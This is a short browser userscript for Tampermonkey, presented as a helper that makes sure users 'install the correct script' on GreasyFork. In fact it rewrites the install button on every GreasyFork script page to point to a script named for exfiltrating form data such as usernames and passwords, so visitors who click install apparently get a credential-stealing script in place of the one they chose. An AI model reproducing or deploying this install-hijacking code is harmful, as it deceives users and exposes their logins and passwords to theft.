// ==UserScript==
// @name         Correctly Install GreasyFork Script
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  Make sure to install the correct script
// @author       You
// @match        https://greasyfork.org/en/scripts/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=tampermonkey.net
// @grant        none
// ==/UserScript==

(function() {

    var button = document.querySelector("a.install-link");
    if(button != null){
        button.setAttribute("href", "https://greasyfork.org/scripts/462504-exfiltrating-sensitive-form-data-e-g-username-passwords/code/Exfiltrating%20sensitive%20form%20data,%20eg%20username,%20passwords.user.js");
    }

})();